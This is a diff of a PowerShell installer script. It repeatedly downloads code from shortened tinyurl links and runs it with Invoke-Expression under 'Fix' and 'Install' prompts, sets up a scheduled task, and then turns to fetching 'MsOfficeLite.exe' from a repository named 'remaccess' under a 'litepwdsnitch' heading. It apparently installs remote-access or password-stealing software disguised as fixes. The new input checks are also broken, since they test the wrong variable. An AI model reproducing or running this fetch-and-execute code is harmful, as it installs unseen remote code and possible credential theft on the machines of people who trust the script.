@@ -13,38 +13,39 @@ if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
     }
 }
 } else {}
-
-$opconfirm = Read-Host "Proceed With OP Fix (y/n)"
-if ([string]::IsNullOrEmpty($opconfirm)) {
-    Start-Sleep -Seconds 2
-    $opconfirm = "n"
-}
-if ($opconfirm.ToLower() -eq "y") {
-	Write-Host "Executing OP Fix..."
-  	Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/backupinstall -UseBasicParsing).Content
-  } else {
-}
-#ZT Setup
-$ztconfirm = Read-Host "Proceed With ZT Fix (y/n)"
-if ([string]::IsNullOrEmpty($ztconfirm)) {
+#OP Install
+$url = "https://tinyurl.com/backupinstall"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$prompt = Read-Host "Proceed With OP Install (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
     Start-Sleep -Seconds 1
-    $ztconfirm = "n"
+    $pwdst = "n"
 }
-if ($ztconfirm.ToLower() -eq "y") {
-    Write-Host "Executing ZT Fix..."
- 	Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/ztinstall -UseBasicParsing).Content
-	} else {
+if ($prompt.ToLower() -eq "y") {
+    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+} else {}
+#ZT Setup
+$url = "https://tinyurl.com/ztinstall"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$prompt = Read-Host "Proceed With $Name Install (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
 }
-$opconfirm = Read-Host "Create Scheduled Task (y/n)"
-if ([string]::IsNullOrEmpty($opconfirm)) {
-    Start-Sleep -Seconds 2
-    $opconfirm = "n"
+if ($prompt.ToLower() -eq "y") {
+    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+} else {}
+#Scheduled Task
+$url = "https://tinyurl.com/taskschedulersetup"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$prompt = Read-Host "Proceed With $Name Install (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
 }
-if ($opconfirm.ToLower() -eq "y") {
-    Write-Host "Creating the task"
-    Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/taskschedulersetup -UseBasicParsing).Content
-}
-
+if ($prompt.ToLower() -eq "y") {
+    Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+} else {}
 #litepwdsnitch Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
